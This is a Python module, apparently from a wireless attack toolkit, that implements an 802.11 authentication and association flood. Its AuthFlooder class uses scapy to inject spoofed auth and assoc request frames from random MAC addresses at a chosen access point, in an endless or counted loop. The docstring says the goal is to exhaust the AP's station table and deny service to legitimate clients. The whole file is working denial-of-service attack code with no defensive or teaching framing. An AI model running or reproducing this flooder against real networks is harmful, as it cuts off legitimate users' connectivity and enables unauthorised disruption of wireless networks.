"""
Auth/Assoc Flood
================
802.11 authentication and association frame flooding.

Floods target AP with auth/assoc requests to exhaust station
slot tables, causing denial of service for legitimate clients.
"""

import random
import threading
import time
from typing import Optional, Dict, Any


class AuthFlooder:
    """Authentication and association frame injection engine."""

    AUTH_OPEN = 0
    AUTH_SHARED = 1

    def __init__(self, iface: str):
        self.iface = iface
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self.stats: Dict[str, Any] = {
            "auth_sent": 0,
            "assoc_sent": 0,
            "start_time": None,
        }

    def _random_mac(self) -> str:
        """Generate random MAC address."""
        return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))

    def _build_auth_frame(self, ap_mac: str, client_mac: str) -> Any:
        """Build 802.11 authentication frame."""
        try:
            from scapy.all import Dot11, Dot11Auth, RadioTap
            return (
                RadioTap()
                / Dot11(addr1=ap_mac, addr2=client_mac, addr3=ap_mac)
                / Dot11Auth(algo=self.AUTH_OPEN, seqnum=1, status=0)
            )
        except Exception:
            return None

    def _build_assoc_frame(self, ap_mac: str, client_mac: str,
                           ssid: str = "") -> Any:
        """Build 802.11 association request frame."""
        try:
            from scapy.all import Dot11, Dot11AssoReq, Dot11Elt, RadioTap
            frame = (
                RadioTap()
                / Dot11(addr1=ap_mac, addr2=client_mac, addr3=ap_mac)
                / Dot11AssoReq(cap=0x2104, listen_interval=0x00)
            )
            if ssid:
                frame /= Dot11Elt(ID="SSID", info=ssid.encode())
            return frame
        except Exception:
            return None

    def start(self, ap_mac: str, mode: str = "auth", count: int = 0,
              interval: float = 0.01) -> bool:
        """
        Start auth/assoc flood attack.

        Args:
            ap_mac: Target access point MAC address
            mode: 'auth' | 'assoc' | 'both'
            count: Number of frames (0 = infinite)
            interval: Delay between frames in seconds

        Returns:
            True if attack started successfully
        """
        self.stats["start_time"] = time.time()
        self._running = True
        self._thread = threading.Thread(
            target=self._flood_loop,
            args=(ap_mac, mode, count, interval),
            daemon=True,
        )
        self._thread.start()
        return True

    def _flood_loop(self, ap_mac: str, mode: str, count: int,
                    interval: float) -> None:
        """Main flood transmission loop."""
        try:
            from scapy.all import sendp
            sent = 0
            while self._running and (count == 0 or sent < count):
                client_mac = self._random_mac()

                if mode in ("auth", "both"):
                    frame = self._build_auth_frame(ap_mac, client_mac)
                    if frame:
                        sendp(frame, iface=self.iface, verbose=0)
                        self.stats["auth_sent"] += 1
                        sent += 1

                if mode in ("assoc", "both"):
                    frame = self._build_assoc_frame(ap_mac, client_mac)
                    if frame:
                        sendp(frame, iface=self.iface, verbose=0)
                        self.stats["assoc_sent"] += 1
                        sent += 1

                time.sleep(interval)
        except Exception as e:
            print(f"[Auth] Flood loop error: {e}")

    def stop(self) -> None:
        """Stop auth/assoc flood attack."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=3)

    def get_stats(self) -> Dict[str, Any]:
        """Return attack statistics."""
        runtime = 0.0
        if self.stats["start_time"]:
            runtime = time.time() - self.stats["start_time"]
        return {
            **self.stats,
            "runtime": round(runtime, 1),
            "running": self._running,
            "total_sent": self.stats["auth_sent"] + self.stats["assoc_sent"],
        }
